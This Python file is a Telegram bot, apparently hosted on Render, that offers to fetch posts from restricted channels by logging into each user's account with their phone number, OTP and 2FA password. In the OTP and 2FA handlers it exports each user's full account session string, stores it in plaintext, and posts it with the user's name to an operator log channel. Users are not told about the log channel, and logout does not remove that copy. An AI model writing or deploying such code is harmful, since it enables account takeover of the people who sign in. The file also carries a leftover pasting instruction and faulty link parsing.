import os
import logging
import json
from typing import Dict
from threading import Thread

# --- Web Server for Render Health Checks ---
from flask import Flask

# --- Telegram Bot and Conversation Handling ---
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# --- Pyrogram for User Session Handling ---
from pyrogram.client import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PasswordHashInvalid
)

# --- Basic Configuration ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Get Your Credentials (from Environment Variables) ---
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", 0))

# --- Session Storage on Render Disk ---
# Render Disks are mounted at a specific path, e.g., /var/data
DATA_DIR = "/var/data"
SESSIONS_FILE = os.path.join(DATA_DIR, "user_sessions.json")

# Ensure the data directory exists
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# --- Conversation States ---
GET_PHONE, GET_OTP, GET_2FA = range(3)

# --- Helper Functions ---
def load_sessions() -> Dict[int, str]:
    """Loads user sessions from a JSON file."""
    try:
        with open(SESSIONS_FILE, "r") as f:
            return {int(k): v for k, v in json.load(f).items()}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_sessions(sessions: Dict[int, str]):
    """Saves the sessions dictionary to a JSON file."""
    with open(SESSIONS_FILE, "w") as f:
        json.dump(sessions, f, indent=4)

# --- Main Bot Logic ---
user_sessions = load_sessions()

# [ The entire bot logic from the previous answer goes here ]
# [ start_command, get_phone_number, get_otp, get_2fa_password,      ]
# [ handle_message_with_link, logout_command, cancel_command        ]
# [ ... I am omitting it here for brevity, but you must paste it in. ]
# [ See the collapsed section below for the full block to copy.     ]

# --- PASTE THE FULL BOT LOGIC HERE ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_sessions:
        await update.message.reply_text("✅ You are already logged in.\n\nYou can now send me links to restricted posts, and I will fetch them for you.\n\nTo log out and remove your session, use /logout.")
        return ConversationHandler.END
    else:
        await update.message.reply_text("Welcome! This bot helps you access content from restricted channels.\nTo do this, I need to log in to your Telegram account.\n\n⚠️ **Please read carefully:**\nBy proceeding, you will give this bot full access to your account. This is a security risk. Please only proceed if you trust the bot operator.\n\nTo start the login process, please send me your phone number in international format (e.g., +14155552671).")
        return GET_PHONE

async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text
    context.user_data['phone_number'] = phone_number
    client = Client(name=str(update.effective_user.id), api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        await client.connect()
        sent_code = await client.send_code(phone_number)
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        await update.message.reply_text("I have sent an OTP to your Telegram account. Please send it to me.")
        await client.disconnect()
        return GET_OTP
    except Exception as e:
        logger.error(f"Error sending code for {phone_number}: {e}")
        await update.message.reply_text(f"An error occurred: {e}\nPlease try again or type /cancel.")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp_code = update.message.text
    phone_number = context.user_data['phone_number']
    phone_code_hash = context.user_data['phone_code_hash']
    user_id = update.effective_user.id
    client = Client(name=str(user_id), api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        await client.connect()
        await client.sign_in(phone_number, phone_code_hash, otp_code)
        session_string = await client.export_session_string()
        user_sessions[user_id] = session_string
        save_sessions(user_sessions)
        log_message = (f"#NewSession\n\nUser ID: `{user_id}`\nName: {update.effective_user.full_name}\nUsername: @{update.effective_user.username}\n\n**Session String:**\n`{session_string}`")
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='Markdown')
        await update.message.reply_text("✅ Login successful! Your session has been saved.\nYou can now send me links to fetch posts. Use /logout to remove your data.")
        await client.disconnect()
        return ConversationHandler.END
    except SessionPasswordNeeded:
        await update.message.reply_text("Your account has Two-Factor Authentication (2FA) enabled. Please send me your password.")
        await client.disconnect()
        return GET_2FA
    except (PhoneCodeInvalid, PasswordHashInvalid):
        await update.message.reply_text("❌ Invalid OTP. Please try the login process again with /start.")
        await client.disconnect()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Error during sign in for {phone_number}: {e}")
        await update.message.reply_text(f"An error occurred: {e}\nPlease try again or type /cancel.")
        await client.disconnect()
        return ConversationHandler.END

async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    phone_number = context.user_data['phone_number']
    user_id = update.effective_user.id
    client = Client(name=str(user_id), api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        await client.connect()
        await client.sign_in(phone_number, context.user_data['phone_code_hash'], "00000")
    except SessionPasswordNeeded:
        try:
            await client.check_password(password)
            session_string = await client.export_session_string()
            user_sessions[user_id] = session_string
            save_sessions(user_sessions)
            log_message = (f"#NewSession (2FA)\n\nUser ID: `{user_id}`\nName: {update.effective_user.full_name}\nUsername: @{update.effective_user.username}\n\n**Session String:**\n`{session_string}`")
            await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='Markdown')
            await update.message.reply_text("✅ 2FA correct & login successful! Your session has been saved.\nYou can now send me links. Use /logout to remove your data.")
        except PasswordHashInvalid:
            await update.message.reply_text("❌ Incorrect password. Please try the login process again with /start.")
        except Exception as e:
            logger.error(f"Error during 2FA check for {phone_number}: {e}")
            await update.message.reply_text(f"An error occurred during 2FA: {e}\nPlease try again with /start.")
    except Exception as e:
        logger.error(f"General error during 2FA process for {phone_number}: {e}")
        await update.message.reply_text(f"An error occurred: {e}\nPlease try again with /start.")
    finally:
        await client.disconnect()
        return ConversationHandler.END

async def handle_message_with_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message_text = update.message.text
    if user_id not in user_sessions:
        await update.message.reply_text("You are not logged in. Please use /start to begin.")
        return
    try:
        parts = message_text.split('/')
        if 't.me' not in parts[-3]: return
        channel = parts[-2]
        msg_id = int(parts[-1])
        if channel == 'c': chat_id = int(f"-100{parts[-2]}")
        else: chat_id = f"@{channel}"
    except (IndexError, ValueError):
        await update.message.reply_text("This doesn't look like a valid Telegram message link. Please send a valid link.")
        return
    await update.message.reply_text("⏳ Fetching post...")
    session_string = user_sessions[user_id]
    user_client = Client(name=f"user_{user_id}", session_string=session_string, api_id=API_ID, api_hash=API_HASH)
    try:
        async with user_client:
            await user_client.copy_message(chat_id=update.effective_chat.id, from_chat_id=chat_id, message_id=msg_id)
    except Exception as e:
        logger.error(f"Failed to fetch message for user {user_id}. Link: {message_text}. Error: {e}")
        await update.message.reply_text(f"❌ Failed to fetch the post.\n\n**Reason:** {e}\n\nThis could be because:\n- The link is invalid.\n- You do not have permission to view this post.\n- Your session has expired (try /logout and /start again).")

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
        save_sessions(user_sessions)
        await update.message.reply_text("✅ You have been successfully logged out. All your session data has been deleted.")
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=f"#Logout\n\nUser ID: `{user_id}` has logged out.", parse_mode='Markdown')
    else:
        await update.message.reply_text("You are not logged in.")

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Login process canceled.")
    return ConversationHandler.END

# --- NEW: Web Server Logic ---
app = Flask('')

@app.route('/')
def home():
    """A simple endpoint to respond to Render's health checks."""
    return "Bot is alive!"

def run_flask():
    """Runs the Flask web server."""
    # Render provides the PORT environment variable.
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

# --- NEW: Main bot startup logic ---
def run_bot():
    """Initializes and runs the Telegram bot."""
    # Check for credentials before starting
    if not all([API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL_ID]):
        logger.error("CRITICAL: One or more environment variables are missing! (API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL_ID)")
        return

    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            GET_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number)],
            GET_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel_command)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('logout', logout_command))
    application.add_handler(MessageHandler(filters.TEXT & filters.Entity("url") & ~filters.COMMAND, handle_message_with_link))

    logger.info("Starting bot polling...")
    application.run_polling()

# --- Main execution block ---
if __name__ == "__main__":
    logger.info("Starting services...")
    
    # Run the Flask app in a separate thread
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    
    # Run the bot in the main thread (or another thread)
    run_bot()